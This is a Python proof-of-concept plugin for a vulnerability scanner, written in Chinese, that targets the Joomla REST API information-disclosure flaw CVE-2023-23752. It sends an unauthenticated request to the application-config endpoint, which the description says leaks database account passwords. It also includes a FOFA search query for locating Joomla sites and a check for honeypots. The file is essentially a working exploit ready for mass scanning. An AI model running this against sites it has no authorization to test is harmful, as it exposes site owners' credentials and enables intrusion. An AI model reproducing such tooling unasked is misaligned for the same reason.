# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Joomla！Rest api 信息泄露（CVE-2023-23752）",                        # 漏洞名称
        "VulnID" : "CVE-2023-23752",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : """
            受影响版本
                4.0.0 <= Joomla <= 4.2.7
            不受影响版本Joomla >= 4.2.8
                Joomla 3及以下版本均不受该漏洞影响
            """,                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Joomla是一套全球知名的内容管理系统（CMS），其使用PHP语言加上MySQL数据库所开发，可以在Linux、Windows、MacOSX等各种不同的平台上运行。
            2月16日，Joomla官方发布安全公告，修复了Joomla! CMS中的一个未授权访问漏洞（CVE-2023-23752）。
            Joomla! CMS 版本4.0.0 - 4.2.7中由于对web 服务端点访问限制不当，可能导致未授权访问Rest API，造成敏感信息泄露（如数据库账号密码等）。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Joomla"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/api/index.php/v1/config/application?public=true" # url自己按需调整
        

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
            if "attributes" in req.text and "application/vnd.api+json" in req.headers["Content-Type"] and "\"links\":{" in req.text and "\"data\":[" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()